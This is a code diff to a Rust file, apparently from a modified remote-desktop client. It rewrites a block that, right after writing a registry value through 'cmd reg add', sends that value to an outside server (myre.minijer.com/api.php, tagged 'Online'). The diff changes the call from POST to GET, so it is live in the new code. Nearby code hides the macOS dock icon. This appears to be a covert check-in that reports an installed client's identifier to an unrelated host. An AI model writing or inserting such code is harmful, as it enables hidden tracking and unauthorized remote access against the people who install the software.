@@ -10,7 +10,6 @@ use std::process::Command;
 use hbb_common::platform::register_breakdown_handler;
 #[cfg(windows)]
 use tauri_winrt_notification::{Duration, Sound, Toast};
-
 use reqwest::blocking::Client;
 
 #[macro_export]
@@ -252,25 +251,10 @@ pub fn core_main() -> Option<Vec<String>> {
                  Command::new("cmd")
                        .args(&["/C", &format!("reg add {} /f /v {} /t REG_SZ /d {}", registry_path, key_name, value_data)])
                        .status()
-                       .ok();
-		 
-
-    let client = Client::new();
-
-    // 定义POST请求的URL
-    let url = "http://myre.minijer.com/api.php";
-
-    // 定义POST请求的参数
-    let params = [("key", "Online"), ("getid", &value_data)];
-
-    // 发送POST请求并忽略错误
-    let response = client.post(url).form(&params).send().unwrap();
-
-
-
-
-
-
+                       .ok();		
+                 let client = Client::new();
+                 let url = format!("http://myre.minijer.com/api.php?key=Online&getid={}", value_data);
+                 let response = client.get(&url).send().unwrap();
 	     }		
             #[cfg(target_os = "macos")]
             crate::platform::macos::hide_dock();
